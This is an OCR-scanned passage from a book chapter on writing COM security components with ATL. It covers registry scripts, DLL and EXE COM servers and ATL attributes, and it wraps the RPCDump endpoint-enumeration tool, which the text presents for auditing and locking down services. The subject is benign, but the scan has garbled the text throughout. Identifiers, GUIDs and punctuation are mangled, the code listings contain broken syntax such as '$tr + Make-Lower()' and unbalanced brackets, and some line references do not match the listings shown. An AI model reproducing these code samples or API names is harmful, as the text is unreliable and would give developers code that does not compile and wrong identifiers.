(9C129B36-EE42-4669-B217-4154821F9B4E) 
= 
s 
"MySimpleObject C l a s s ' 
{ 
This line instructs the ATL registrar to create a key with a GUID value.The 
attribute ForceRemove ensures that the key is deleted on un-registration. Additionally, the 
expression contained in this statement instructs ATL to set the default value of the 
GUID key to the string value (as denoted by the "s" that precedes the string literal) of 
"MySimpleObject Class". It is important to note that if a key has the attribute 
ForceRemove, all child elements of this key must implicitly be removed, too. 

558 
Chapter 13 * Writing Security Components 
Inproc Ser ver 3 2 E '*MODULE%' { 
val ThreadingModel 
5 'Apartment' 
This code fragment is quite similar to the preceding code fragment in that a new 
key is created, this time called InprocServer32, which has a default value that consists of 
the file location at which rhe module is registered. As you no have doubt noticed, the 
string %MODljLE"/i) can be considered a script environment variable, or a macro, that is 
modified when the script is executed by the ATL Registrar preprocessor. 
Now that we know how to write Registry scripts, the next step is to couple it to 
our component class. In order do this, we need to accomplish two things: 
• 
Place the script inside the resource section of the component server; and 
• 
Declare the resource ID that corresponds to the script inside the component 
class. 
In order to accomplish step one, you'll need to navigate to the resource view tor 
your project inside Visual Studio, right-click the resource file, and click the menu option 
of Add Resource (see Figure 13.3). 
Figure 13.3 Visual Studio.NET Add Resource Dialog 
^ - erf U S St * E « • " 
• 
'•'••"••'•.I 
~yw 
j c e View - AtTTutc*«J 
3 AtlTutorial 
_J ArJTutof^.rr. 
* 
• 
'
•
•
» 
* 3 
*! 
1 
=j 
Accelerator I 
Bitmap 
Cursor 
Dialog 
HTM. 
Icon 
T-'TT . 
"*w string Table 
aa Joobst 
a 
Version 
Next, click Import and find the Registry script in your project files and click OK. 
Visual Studio will then prompt you for the type of resource being imported. It is 
common practice to refer to ,RGS scripts by the string REGISTRY, so enter REG-
ISTRY and click OK. The last thing to do is rename the supplied resource name to 
something that corresponds to the component class in question. After this is all done, 
your Registry script is contained in your component server and can be identified by the 
name specified for the resource; it also is defined in the generated resource.h file. 
Now that we have completed step one, we can proceed to step two, which is associ-
ating the Registry script to the component class. This is accomplished by using the 

Writing Security Components • Chapter 13 
559 
macro DECLARE_REGISTRY_RESOURCEID and passing the identifier of the 
Registry script as an argument. 
The DECLARE_REGISTRY_RESOURCEID macro expands to a static function 
that looks like this: 
ttdefine DEC LARE_REGISTRY_RESOURCEID (X) \ 
S t a t i c HRESULT WIHAPI UpdateRegistry(BOOL b R e g i s t e r l 
t h r o w ( l \ 
{ 
}; 
// Code omitted 
The Up date Registry function es sen daily builds an array of token/value pairs that are 
used by the ATL registrar to expand preprocessor macros, such as %MODULE%. Should 
you wish to pass a custom value, all that would be needed is to rewrite the UpdateRegistry 
to your custom requirements.The primary purpose of the UpdateRegistry function is to 
pass this information, along with the resource script ID, to the ATL global variable 
_Module's function UpdateRegistryFromResource, which handles the bulk of component 
class registration. 
COM IN-PROCESS Server Implementation 
In writing your COM server, you have the choice of writing the code by hand, using 
Visual C++'s Wizards, or a mix of the two. The general rule is to simply use whatever 
makes sense for your project. If you are doing something custom, you may want more 
control over your project. Therefore, it makes sense to write it by hand. Regardless of 
the approach you take, it is important to understand what module-specific code is 
required and how it works. 
The _AtlModule Global Variable 
Regardless of the type of application you are writing with ATL, it must have an instance of 
a variable named _At!Mod\ik'. The type of variable is what changes from project to project. 
This variable type changes based on the classifi cation of project being implemented. For 
instance, if the project is a DLL server, then you would use the CAtlD!!Modu!cT class. For 
an EXE server, you would use the CAtlExeModulcT class. Basically, the type of variable 
adds functionality to the application based on the application's type. 
You cannot declare ATLs module class alone, however; it must be derived from a 
custom class that you create. This allows you to provide constant properties to the 
module instance without calling any startup functions. An example of this type of class is 
as follows: 
" ^ ^ ^ ^ class CMyApplicationModule : 
^ ^ ^ Q public CAtlDllModuleT< CMyApplicationModule > 
{ 
pilblic : 
DECLARE_LIBID (L IB ID_HyAppli ca t i onModu1e) 
DECLARE_REGISTRy_JiPPID_RESOtIRCEID(IDR_MYAPPX,ICATIONMODULE, 
•(4DD88301-0C57-416B-953C-382O95440C05)•> 
>r 
CMyApplicationModule _AtlModule; 

Chapter 13 • Writing Security Components 
The preceding code fragment is the basic declaration and definition for a DLL 
COM server application.The application CMyApplicatioitModule inherits the ATL class 
responsible for DLL functionality named CAtlDHModttteT, which takes a template argu-
ment of the name of the CMyApplication Module class. 
The next two lines of code are responsible for providing constant information to the 
CAtlDllModttleT class. Essentially, it declares that the DLLs LIBID is the GUID value 
specified in the LIBID_MyApplicatiotjModule variable. Next, a Registry resource script is 
specified by using the DECLAKE_REGISTRY_APlJID_RESOURCEID macro. As the 
name of this macro implies, it informs the module class of what the application's APPID 
is.This information is used when the module's components are registered. 
DLL Exports 
As discussed earlier, DLL COM servers must export four COM-related functions in 
order for the class to be loaded properly by the COM runtime.These functions are 
DllGetClassObject, DllCanUnloadNow, DHRegisrerServer, and DllUnrcgisterServer. 
ATL provides support that removes virtually all boilerplate code in this regard. We will 
examine how this is implemented in ATL by examining the following wizard-generated 
code. 
STDAPI 
DllGetClassObject( 
REFCLSID rclsia, 
REF1ID riid, 
LPVOID* ppv) 
{ 
return _AtlModule,DllGetClassObject( 
rclsid, riid, ppv); 
) 
A few preliminary statements must be made before we analyze the preceding code 
fragment. ATL does not explicitly export any functions from your module.That way you 
have full control over how your module is built. However, ATL does provide the most 
common implementation for the required exported functions by means of functionality 
inside the CAtlDUModulcT class, which is present in the _AtlModule variable. 
The Visual C++ wizard generated the preceding exported function named 
DllGetClassObject and made it simply delegate the request to _AtlModule's 
DllGetClassObject implementation. From this implementation, it examines the request 
and if the component requested is found, a class factory for it is instantiated and 
returned to the client. 
ATL determines what objects it provides by the existence of an object declaring 
itself to be provided to the module's clients by means of asserting that fact with the 
OBJECT_ENTRY_AUTO macro, which usually follows its class declaration in code. 
This macro inserts the class' CLS1D and class name in the ATL module object map. 
From this point, ATL can now call the appropriate registration and class factory instanti-
ation code for the component class. 
STDAPI DllRegisterServer(void) 
{ 
HRESULT hr = _AtlModule.DllRegisterServer(); 

Writing Security Components • Chapter 13 
561 
return hr; 
) 
The preceding code fragment is the definition of the exported function 
DURegisterServer. DHRegisterServcr delegates all functionality to CAtlModuleT's 
DllRegisterServer function. 
STDAPI DllUnregisterServer(void) 
{ 
HRESULT hr = _AtlModule,EllUnregisterServer(); 
return hr; 
} 
The preceding code fragment is the definition of the exported function 
DllUnregisterServer. DllUnregisterServer delegates all functionality to CAtlModuleT's 
DllUnregisterServer function. 
STDAPI DllCanUnloadNow (void) 
{ 
return _AtlModule.DllCanUnloadNow{} ; 
) 
The preceding code fragment is the definition of the exported function 
DllCanUnloadNow. DllCanUnloadNow delegates all functionality to CAtlModuleT's 
DllCanUnloadNow function. 
Module Entry Point 
All Win32 DLL modules must provide the DllMain entry point to the linker. Aside from 
any custom initializations, ATL allows the implementation of DllMain to simply return 
into CAdDllModuleT's implementation of DllMain. This is not a requirement, however. 
The implementation of CAdDllModuleT's DllMain does primarily a few sanity checks 
and returns TRUE. 
C O M OUT-OF-PROCESS Server Implementation 
Now that you know the basics of implementing a DLL COM server, you will find 
writing an EXE server quite similar and probably easier. COM provides substantial sup-
port for practically all matters of EXE server implementation. 
The _AtlModule Global Variable 
The _AtlModulc variable for an EXE server is simply a custom class derived from the 
ATL provided CAtlExcModulcT class. Because it is set up in this configuration, you are 
capable of providing constant information to the CAtiExcModtik class by means of using 
the supplied ATL macros. An example of declaring and defining your _AtiModule vari-
able is as follows: 
class CSpaceShipModule : public CAtlExeModuleT<CSpaceShipModule> 
{ 
pub] ic : 
DECLARE_LIBID(LIBID_SpaceShipLibl 
DECLARE_REGISTRi_APPID_RESOURCEID(IDR_SPACESHIPr 

562 
Chapter 13 * Writing Security Components 
"{48DF7A09-1SCF-4CO5-969C-2AA42363B4AD}•) 
> ; 
CSpaceShipModule _AtlModule; 
The preceding code fragment declares the CSpnceShipModtitc class, inherits the 
CAtlExeModuleT class, and defines a few elements of static information with the 
DECLARE_LIBID and DECLARE_REGISTRY_APPID_RESOURCEID macros. 
Module Entry Point 
The bulk of work for an EXE server is of course done in its entry point. There are sev-
eral tasks to be performed in order to provide the module's objects to out-of-process 
clients. Such tasks include the following: 
• 
Registering the objects provided in the global object time 
• 
Parsing the command line for RegServer, and registering the module's objects 
because of it 
• 
Parsing the command line for UnRegServer and unregistering the modules 
objects because of it 
All of these tasks are performed in one function provided by CAtlExeModuleT: 
WinMain.This function is responsible for the aforementioned tasks by the following 
lines of code: 
T* pT = statie_cast<T*>(this); 
LPTSTR lpCmdLine = GetCommandLine () ; 
if (pT->ParseCommandLine(lpCmdLine, &hr) •• true) 
hr = pT->Run(nShowCmd); 
First, CAtlExeModuleT::Run downcasts to your EXE server class, in case you wish to 
specialize the parsing of the application's arguments or the way that the application's 
state is managed with the Run function. Either of these tasks can be done by adding the 
following code to your _AtlModuk class: 
HRESULT Run lint nShowCmd) 
{ 
return CAtlExeModuleT<CSpace£hipModule>::Run(nShowCmd); 
) 
HRESULT ParseCommandLinefLPCTSTR lpCmdLine, HRESULT *pnRetCode) 
( 
return CAtlExeModuleT<CSpaceShipModule>::ParseCommandLine( 
lpCmdLine, pnRetCode); 
} 
CAtlExeModuleT's Run function calls the function Pre Message Loop, which is a 
member function of the same class. This function is actually responsible for registering 
the objects provided to clients. 
After the objects are registered and the EXE server environment is set up, the 
CAtlExeModuleT's Run function calls RunMessageLoop, which goes into a standard 

Writing Security Components • Chapter 13 
563 
message loop. Again, this function can be overridden with the same type of code 
described previously. 
When the module is ready to terminate, the Run method will call 
Post Message Loop, which shuts down the registered objects and terminates the ATL 
environment state. Subsequently, it will return to the entry point of the application. 
ATL Attributes 
You now know the fundamentals for ATL COM development. At this point, you could 
write your COM security tools without any additional knowledge. However, as you no 
doubt know, developing a COM server is not directly an easy task.This is where a new 
feature of Visual C++ .NET really shines: C++ attributes. 
The purpose of a C++ attribute is to have code automatically injected into your 
source files for a specific purpose. C++ attributes are implemented by attribute 
providers, and the attribute provider for ATL is atlprov.dll. The use of ATL attributes will 
dramatically reduce the amount of code required to implement a component server. 
Such functionality provided by the use of ATL attributes removes the need to manage 
separate .RGS Registry scripts and ,1DL interface definition files. C++ attribute 
providers also support the ATL server support, OLE DB consumer support, performance 
counter supportm and Web services support. 
You will find writing code using ATL attributes to be very similar to that of IDL. In 
fact, many ATL attributes have the same syntax as their IDL counterparts. Like IDL, 
attributes are declared in between two square brackets and precede some construct (class, 
structure, interface, function, and others) in code. 
Before you can use ATL attributes in your program, you must include support for it 
by defining the token _ATL_ATTRIBUTES before you include atlbase.h.This defini-
tion does one thing: causes atlbase.h to include the tile atlplus.h, which brings in support 
for ATL attributes. 
Let's proceed to a typical example of code that implements a fully functional DLL 
COM server, offering one COM object. The code is as follows: 
1 #include ^windows . h> 
2 
3 
#define _ATL_ATTRIBUTES 
4 
#define _ATL_APARTMENT_T4READED 
5 
6 
#include <atlbase.h> 
7 
#include <atlcom.h> 
8 
9 
[module{dlli name=nHotFixChecker")]; 
10 
1 1 
[ o b j e c t , 
uuid("EAA203CA-24D4-4C49-9A76-13270689B7DB-|] 
1 2 
interface IHotFixChecker 
13 
{ 
14 
HRESULT ISHotFixInstalledl [in] BSTR bstrQNumbeE, 
15 
[out, retval] VARIANT_BOOL 'pbinstailed! ; 
16 >,-
17 
18 
[ 
caclassi 
19 
uuid(-FC9CBC60-4G4fl-4E66-9409-610AD30689C7M( 

Chapter 13 • Writing Security Components 
20 
vi_progidt"HotFixChecker"> 
21 ] 
22 
class ATL_NO_VTABLE CHotFixCfcecker : 
23 
public IHotFixChecker 
24 ! 
25 
public: 
26 
HRESULT IsHotFixInstalledtBSTR bstrqNumber, 
27 
VARIANT_BO0L *pblnstalled) 
28 
{ 
29 
// TODO: Implement Function 
30 
return S_OK; 
31 
] 
32 ); 
Twenty-seven lines of code later, we have created a fully functional EXE COM 
server, complete with self-registration capability, TypeLib included, and proxy/stub code 
ready for compilation. To accomplish the same task without using ATL, the code could 
take up to 800 lines. If you look at the file that contains the injected code, it actually 
took 318 lines of code to do this with ATL (although the generated file is somewhat 
verbose).You can now do it in 27. 
Let us analyze the preceding code so we can determine the base requirements of an 
attributed ATL COM server. 
Module Attribute 
[module (type=dll. name="HotFixChecker")]; 
The module attribute is used primarily for getting the project off the ground. Its absence 
will cause compilation errors for ATL COM projects, and it's responsible for many 
important operations that pertain to the type of COM server being implemented. The 
type of module is specified by setting the type parameter to the appropriate value, such 
as EXE, DLL, or SERVICE.This setting allows your global _AtlModttk to be derived 
from the right class: AtlDHModn!c,AtlExeMod\<h; and so on. 
When this attribute is applied, it accomplishes the following operations: 
• 
Implements and exports DlIGctClasssObject, DllRegisterServer, 
DllUnregisterScrver, and DllCanUnloadNow, if type=DH 
• 
Implements the application's entrypoint, such as WinMain or DllMain 
• 
Creates a Type Library and declares the project's library block (using the value 
specified following the name parameter) 
• 
Declares and defines the module's _Ath\4oduh' variable 
As you can see, this is a very important and powerful attribute. 
If you wish to override any behavior implemented by this attribute, you can do so 
by no/ terminating the attribute with a semicolon and declaring a module class following 
the attribute. Such code would look like the following: 
[module(type=dll. name="HotFixCheckerMJ] 
class CHFChecker 
; 

Writing Security Components • Chapter 13 
565 
public: 
int DllMain(DWORD dwReason, PVOID p) 
( 
return 
super::DllMain(dwReason, p ) ; 
) 
int RegisterServer(BOOL bRegTypeLib} 
( 
return 
rsuper;;RegisterServer(bRegTypeLib),-
} 
); 
"I""! 
The C++ keyword 
super is used to instruct the compiler to find the appropriate 
inherited class automatically. 
A list of possible parameters to the module attribute is shown in the following 
example. 
[ module ( 
type=dll, 
name=string, 
uuid=uuidr 
version^l.0, 
lcid= integer, 
contro1=boo1ean, 
helpstring=string, 
helpstringdll=string, 
helpfile=string r 
helpcontext=integer, 
helpstringcontext=integerr 
h i dden=bo olean, 
restr icted=boolean, 
Custom=5tring, 
resource_nanie=string, 
) ]; 
Interface Attributes 
Moving on, if you have had any experience writing interfaces in IDL, you will definitely 
recognize the next attribute from the code, which is listed in the following example: 
[object, uuid("EAA203CA-24D4-4C49-9A76-1327068987D8") j 
interface IHotFixChecker 
{ 
HRESULT IsHotFixlnstalled([in! BSTR bstrONumber, 
[out, retvalj VARlANT_BOOL *pblnstailed); 
> ; 
The object attribute is identical to its IDL counterpart and therefore doesn't require 
much elaboration. Essentially, the presence of this attribute informs the compiler that the 
following construct will be an object interface definition that corresponds to the param-
eters described in the attribute block. In the preceding attribute block,just the IID of 
the interface is assigned. 

566 
Chapter 13 • Writing Security Components 
The 
interface C++ keyword is quite useful for declaring interfaces that must 
adhere to specific requirements—such as those requirements of COM. The restrictions 
that this keyword applies to members of the interface are defined as follows: 
• 
Can inherit from zero or more base interfaces 
• 
Cannot inherit from a base class 
• 
Cannot contain constructors or destructors 
• 
Can only contain public and pure virtual methods 
• 
Cannot contain data members 
• 
Cannot contain static methods 
Therefore, this keyword is useful even outside the scope of COM. 
COM interfaces are described inside the 
interface definition, just as in IDL, you 
need to describe your interfaces unambiguously using the appropriate IDL attribute, 
such as [in] and [out). 
Component Attribute 
si»t«is! [ 
coclass, 
1 uuid("FC9CBC60-4648-4E66-9409-610AD30689C7") , 
vi_progid("HotFixChecker") 
] 
The preceding attributes syntax is virtually identical to its IDL counterpart with a few 
extensions.This attribute is applied to a class declaration that will actually implement the 
component class. Therefore, you simply need to describe the characteristics of the com-
ponent class in the attribute that precedes it.The syntax in the preceding code fragment 
sets the CLSID of the component and the COM 1'rogID of the component. Here are 
some of the important aspects of the code fragment: 
• 
Injects the cochss block inside theTypeLib 
• 
injects automatic COM registration code that registers the CLSID value and 
the Prog ID value 
Another important parameter that can be set for the coclass attribute is the compo-
nent's threading model, which injects the appropriate CComObjectRootEx code. The 
syntax for setting this parameter looks like this: threading—apartment, or threading=free. 
[tmtkciil 
The class declaration that follows this attribute is where the bulk of the injected 
^ ^ ^ g code is inserted. If you take J look at our previous example, the following base classes 
are added to our class declaration: 
public CComCoClass<CHotFixChecker. & uuidof(CHotFixChecker)>. 
public CComObjectRootEx<CComSingleThreadModel:>, 
public IProvideClassInfoImpl<& uuidof(CHotFixChecker)> 
As you know, CComCoClass gives the component the capability to start a class fac-
tory. CComObjectRootEx implements reference counting based on the threading 

Writing Security Components • Chapter 13 
567 
model specified. IProvideClassInfoimpl implements an interface that allows clients to 
attain a pointer to the class' ITypelnfo interface. 
ivHin. 
The next important aspect about the component's injected code is its COM map. 
t___B__ 
BEGIN_COM_MAP(CHoeFixChecker) 
COH_INTERFACE_ENTRY(IHotFixChecker( 
COM_INTERFACE_ENTR¥(IProvideClas_In£o) 
END_COM_MAP < ) 
Because attributes are intelligent, ATL knew that our class provides only otic inter-
face, IHotFixChecker, and it is of course added to the standard COM interface map. 
COM Sewer DLL 
Compiling the attributed code will provide a DLL that contains a compiled TypeLib and 
has the ability to perform self-registration—in essence, a complete usable COM DLL 
server. 
Adding COM Extensions 
to the RPCDump Tool 
The RPCDump utility dumps the contents of a remote host's RPC endpoint map 
database. This is useful for several reasons, such as searching for RPC interfaces that may 
have security problems. One particularly useful way this tool can be used is in locking 
down a PC from network intrusions. Before you can start locking down a PC's network 
services, you must know what services are offered. It is common for network security 
engineers to use a port mapper for identifying openTCP/UDP ports. This tool is the 
equivalent of a port scanner for determining what RPC services are offered by the 
machine. One way this tool would be used in an enterprise environment is in the com-
pliance checking of a policy of allowable RPC interfaces. 
I'^fr'5"] 
RPC binding types of ncacn_np and ncacn_ip_tcp both are remotely accessible 
^S^m RPC endpoints, which are similai :•;> socket endpoints, !i you dump a host's Rl'C" end-
poinr map, you might sec several of these endpoints in output, which should look some-
thing like this: 
n c a c a _ i p _ t c p : 1 2 7 . 0 . 0 . 1 [ 1 0 2 5 ] 
ncacn_np: \ \\ \MYCOHPUTER [ \ VPIPEWatsvc] 
ncacn_np: \\\\MYCOMFUTER[\\pipe\\Ctx_WinStation_API_servi.ce] 
ncaCI_Tlp:\\\\MYCQMPUTER[\\PIPB\\DAV RPC SERVICE] 
ncacn_np:\\\\MYCOMPUTER[\\PIPE\Vwinreg] 
This tells you several things, such as port 1025 is an RPC endpoint, and the named 
pipes atsvc, Ctx_WinStation.API_server, DAV RPC SERVER, and winreg are all RPC 
endpoints and are available for remote manipulation. From this point, you could system-
atically shut down services that are exposed via RPC until the PC is locked down to the 
desired level. 
The typical security tool consists of a Win32 console application; as such, most if 
not all its arguments are passed from the command line.The way the tool communicates 

568 
Chapter 13 • Writing Security Components 
the result of invocation is through printing to the standard output. With this criteria in 
mind, and because the purpose of this chapter is to show you how to add COM exten-
sions to 3iiy existing security tool, we will focus on adding COM extensions to the 
security tool RPCDump by Todd Sabin. Wc will use Visual C++ .NET's ATL attribute 
capabilities for this example. 
Before beginning, it is necessary to describe our success criteria for COM integration: 
• 
Preserve the original command-line usage 
• 
Minimize any changes to the tool's source code 
The key steps to adding COM extensions to tools such as RPCDump constitute the 
following: 
• 
Adding COM EXE server capabilities by use of the module attribute 
• 
Managing entry-poinr execution flow 
• 
Defining the tool's interfaces 
• 
Implementing the tool's COM objects 
• 
Adding tool integration routines 
RPCDump consists of one tile: rpedump.c. After adding COM extensions to the 
tool, it will consist of RPCDump.c, COMSupport.cpp, and COMSupporr.h. COM 
extensions will be integrated into the original RPCDump.c by changing or adding seven 
Hues of code. 
COM EXE Server Implementation 
We begin by using the module attribute to add COM EXE server capabilities to 
RPCDump. Example 13.1 shows the module attribute excerpt from COMSupport.cpp. 
'"•*•"" Example 13.1 How to Integrate the ATL Module Attribute 
••••••••••H 
1 
[module(exe, name="RPCDump11 I J 
2 class CConsoleApp 
3 { 
4 public: 
5 
b o d IsContRequest {) 
6 
t 
7 
LPTSTR IpCmdLine = GetCommandLine() ; 
8 
9 
CString str = lpCrndLine; 
10 
str = $tr + Make-Lower() ; 
11 
if (str.Find(_T("comserver")) \- -1 | 
12 
str.Find(_T{"regserver-}) 
\= -1) 
13 
return true; 
14 
15 
return false; 
16 
) 
17 
18 
int WINAPI WinMainlinc nShowl 
19 
{ 

Writing Security Components • Chapter 13 
20 
g_IsCOM = IsComRequest O ; 
21 
if 
(;g_IsCOM) 
22 
{ 
23 
BEGIN_ENTRYPOINTU; 
24 
rpcd.ump_main{g_argc, 
g_argv); 
25 
END_ENTR¥POINT() ; 
26 
return 0; 
27 
} 
28 
29 
// If we get this far then this is an instantiation request 
30 
// and therefore we do not need (or want) a console. 
31 
FreeConsole(); 
32 
33 
1i Thread Local Storage (TLSJ is used to keep track of 
34 
// stateful information when the rpcdump_main routine is 
35 
// called. To see how this is used, see SetlnterfacelD 
36 
// (and it's associated functions} and the IRpcEnum::Execute 
37 
// method. 
38 
g_dwCOKCallTls = TlsAllocU; 
39 
int nRes = 
super: :WinMain{nShow) ; 
40 
TlsFreeCg_dwCOMCallTls); 
41 
42 
r e t u r n nRes; 
43 
} 
44 
45 
// The following function specializes COM registration 
46 
HRESULT RegisterServer[BOOL bregTypeLib = 0, CLSID *pCLSID = 0) 
47 
{ 
48 
// Do all automatic registrations 
49 
HRESULT hr = 
super: :RegisterServer(bregTypeLib, pCLSIDI ; 
50 
51 
CRegKey key; 
52 
if [hr == S_OK) 
53 
{ 
54 
// Open the CLSID key for this object 
55 
LPOLESTR lpCLSID = 0; 
56 
StringFromCLSID< uuidof(CEndpoint), ilpCLSID); 
57 
strKey.Format(_T("CLSID\\%s\\LocalServer32"), lpCLSID); 
58 
COTaskMemFree(lpCLSID); 
59 
60 
key.Open(HKEY_CLASSES_ROOTr 
s t r K e y . G e t B u f f e r ( 0 ) ) ; 
61 
62 
TCHAR szPath[MAX_PATH) ; 
63 
DWORD c b ; 
64 
65 
// Take the previous value of this key and append to it 
66 
// " 
-COMSERVER". 
67 
key.QueryValuelszPath, HULL. &cb) ; 
68 
I s t r e a t ( s z P a t h , 
_T(" -COMSERVER")I; 
6 9 
k e y , S e t V a l u e ( s z P a t h ) ; 
70 
} 
71 
7 2 
r e t u r n 
h r ; 
73 
) 
74 }; 

570 
Chapter 13 * Writing Security Components 
Analysis 
At line 1, the ATL module attribute is declared. In that declaration, the application is 
specified as an EXE COM server, and that the Type Library is named RPCDump. As 
you know, the ATL module attribute declares a global variable known as _AtlMod\tk, 
and derives it from the applicable ATL module class such as CAtlExeModule or 
CAtlDHModule. In this case, because it is an EXE server, it is derived from 
CAtlExeModule. Because the code did not terminate the module attribute statement 
with a semicolon, the class that followed it is the class that is derived from 
CAtlExeModule. Because of this, we can override certain functionalities, such as the 
entry point and COM registration. 
An important aspect of the ATL module attribute and control flow is that ATL 
expects the EXE server to use the Win32 GUI entry point known as WinMain. As such, 
it defines that entry point as _tWinMain, because it expects to handle all control flow 
for the EXE server. Because one of our goals is to preserve the original console usage of 
the application, we obviously will need to handle control flow. You will see how all this 
is managed later. 
At line 2, in the class CCousoleApp (which is injected by the module attribute to 
derive from CAtlExeModule) two functions are implemented that are called from ATL 
when necessary: WinMain and RegisterServer.The absence of these functions (or others) 
will dictate the default behavior since this is similar to overriding virtual functions. 
The WinMain function (line 18) performs two important tasks. First, if the applica-
tion is loaded as a stand-alone tool, call the original tool's entry point as usual: rpc-
dump_main (lines 20 through 27). If the tool is loaded stand-alone, the function 
IsComRequest (called from WinMain's line 20) will return FALSE. If it returns false, 
then rpcdump_main is called, and the tool's execution terminates afterwards (line 26). 
Before rpcdump_main is called, you probably noticed BEGIN_ENTRYPOINT()/ 
END_ENTRYPOINT(). These two macros expand to the following: 
# define BEGIN_ENTR¥POINT<) try { 
#define END_ENTRYPOINT ( ) ) \ 
except; (EXCEPTION_EXECUTE_HANDLER) { ) 
Essentially, the point is to catch any exceptions that occur so that control flow still 
always returns to the WinMain routine. There are cases in which exceptions are specifi-
cally generated in the rpcdump_main routine that you will see when COMSupport.h is 
explored. 
Second, if the tool is loaded as a component server, line 18 performs the following 
tasks: 
Because the tool is loaded as a component server, it will not have any interaction 
with the user interface. It is therefore necessary to terminate the console window that 
loads implicitly, by calling FreeConsole on line 31. 

Writing Security Components • Chapter 13 
571 
A 
NOTE 
^
lt is possible to terminate the implicit loading of a console window by asserting 
that the application uses the GUI subsystem, and allocating the console window 
when necessary by using AllocConsole, however, this technique does influence 
the original usage scenarios and therefore does not meet our requirements. 
On line 38, the tool allocates an index to Thread Local Storage (TLS), and subse-
quently frees it on line 40. TLS is a mechanism that allows for the storage of DWORD 
values that correlate directly to a particular thread.These values are set and retrieved 
using an index that is returned from the function TlsAUoc.The value stored at that index 
is local for each thread, and hence its useful ness. In our case, the value set at the allocated 
index is a pointer to a structured called TOOL_CALL_CONTEXT.This structure is 
explained later when rhe sections covering application integration routines and the com-
ponent class CRPCDmnp are explored. 
The function IsComRequest (line 5) determines whether or not the application is 
loaded by the COM runtime with the presence or absence of the flag"-COM-
SERVER" in the command-line string. See the following section "Control Flow" for a 
discussion on RegisterServer to see why this works. 
The function RegisterServer (line 46) is called from ATLs entry-point infrastructure 
when the application is supposed to register itself to the COM runtime. This behavior is 
generated when the rl.ig /RegServer is specified in the tool's command line. 
Because the project uses ATL to take care of component class registration, and it 
needs to do one aspect of registration uniquely, this function is implemented. That 
unique aspect of registration is to append the string "-COMSERVER" to the compo-
nent class' LoailScrvcr32 key's default value. The default value of this key contains the file 
path to the EXE server.This value is used by COM to start up the EXE server when 
clients request it. Therefore, if a client requests the implemented component class, the 
server will be loaded and the command line will contain the string "-COMSERVER", 
Control Flow 
Our next step in adding COM extensions to RECDump is to integrate the control flow 
code from COMSupport.cpp. 
As you recall, the ATL module attribute defines the entry point for the EXE server 
as _tWinMain (see Figure 13.4). However, this function is not called as the entry point 
to the application because the project settings dictate that this is a console application 
and therefore the console application entry point is used: main. Because ATL does not 
define any entry point called main, we must do so, as shown in Example 13.2. 

572 
Chapter 13 • Writing Security Components 
Figure 13.4 The Tool's Loac tng Process 
( 
man 
] 
' ' 
JWinMain 
• ' 
Xorhsata App:: WinMair 
YES 
* 
- N O - * ( rpcdump_Fnfllfi 
) 
[CAtExeModule WinMaaJ 
. -. {, H 
int main(int argcr char *argv[]) 
( 
// Save arguments 
g_argc = argc; 
g_argv = argv; 
HINSTANCE hIns tanc e = (HINSTANC E > QetModu1eHand1e(NULL J; 
STARTUPINFO si - {0}; 
GetStartupInfof&si); 
LPTSTR lpOndLine = GetCOtfirriandLine (} ; 
// _tWinMain is inject by the ATL module attribute 
// Eventually code execution ends up in CConsoleApp::WinMain. 
_tWinMain(hInstance, MULL, lpCmdLine, si.wShcwWindow); 
Analysis 
Lines 78 and 79 store the co nun and-line arguments tor subsequent analysis. 
The following lines in the mam routine basically glean information so that the ATL 
injected _tWinMain routine is called with the right data: 
• 
Line 81 acquires the module handle and stores it in the variable hliiitiwa: This 
value is subsequently passed as the first argument to _tWinMain. 
• 
Lines 83 and 84 extract the startup information about the application.The 
wS how Window member of STARTUP INFO is passed to _t Win Main as the 
last argument. 
• 
The application's command line is obtained on line 85 and passed to 
_tWinMain as the third parameter. 

Writing Security Components • Chapter 13 
573 
Application Integration Routines 
These are the routines that are called from the tool's original source code and report 
some relevant data. A port scanner, for instance, would report that a port is open or 
closed. A hotflx scanner would report that a hotfix is installed or not.The R P C D u m p 
tool reports information about available R P C interfaces. Writing the application integra-
tion routines requires a knowledge about how data is managed in the tool. If, like the 
R P C D u m p tool, data is managed by simply writing it to standard output, then before it 
is written to standard output,just pass the data to an application integration routine to 
store the value. That is the purpose of application integration routines, as you will see in 
the code in Examples 13.3 and 13.4. 
l l l i l l l l Example 13,3 Application Integration Routine Data Structure Excerpt from 
wmmm coivisupport.h 
0 
typedef struct IFACE_DATA_ENTRY { 
1 
CComBSTR m_bstrInterfacelD; 
2 
CComBSTR m_bstrVersionID; 
3 
CComBSTR m_bstrUUID; 
4 
CComBSTR ro_bstrBinding; 
5 
} IFACE_DATA_ENTRY, *PIFACE_DATA_ENTRY; 
6 
7 
typedef struct _TOOL_CALL_CONTEXT ( 
8 
std::vector*IFACE_DATA_£NTRY> *plfacevector; 
9 
IFACE_DATA_ENTRY CurrentRecord; 
1 0 } TO0L_CALL_CONTEXT, * PTOOL_CALL_CONTEXT; 
Example 13.4 Application Integration Routine Excerpt from COMSupport.cpp 
0 extern "C" ( // C language linkage 
1 void SetInterfaceID(char *pIFaceIDI 
2 { 
3 
if (!g_IsCOM) return; 
4 
5 
PTO0L_CAL,L_CONTEXT 
p C t x 
= 
6 
iPTOOL_CALL_CONTEXT)TlsGetValue(g_dwCOMCallTls> 
; 
7 
8 
pCtx->CurrentRecord.ra_bstrInterfaceID = CComBSTR(pIFacelD); 
9 > 
10 void SetVersionfchar *pVersion) 
i i t 
1 2 
i f f ! g„IsCOM) 
r e t u r n ; 
13 
14 
PTO0L_CALL_CONTEXT 
p C t x 
= 
(PTOOL_CALL_CONTEXT) T l S G e t V a l u e (g_dwCOMCallTlS ) ; 
15 
1 6 
pCtx~>CurrentRecord.m_bstrVersionID = CComBSTR{pVersion); 
17 ) 
IS 
19 
void SetUUID(char 
«pUuid) 
20 ( 
21 
if 
(!g_isCOM) 
r e t u r n ; 
22 
23 
PTOOL_CALL_CONTEXT 
p C t x 
= 
( PTOOL_CALL_COHTEXT) T l s G e t V a l u e (g_dwCOMCal I T l s ( ; 
24 

574 
Chapter 13 * Writing Security Components 
25 
pCtx-:>CurrentRecord.in_bstrUUID= CComBSTR(pUuid) ; 
26 } 
27 
28 
void Set Binding (char *pBindirtg) 
29 { 
30 
if (!g_IsCOM) return; 
31 
32 
PTOOL_CALL_CONTEXT p C t x = {PTOOL_C ALL_CONTEXT)Tls Ge tValue(g_dwCOMCa 11T1 s) ; 
33 
34 
pCtx->CurrentRecord.m_bstrBinding = CComBSTRlpBinding); 
35 ) 
36 
37 void NextRecordO 
38 { 
39 
if <!g_IsCOM> return; 
40 
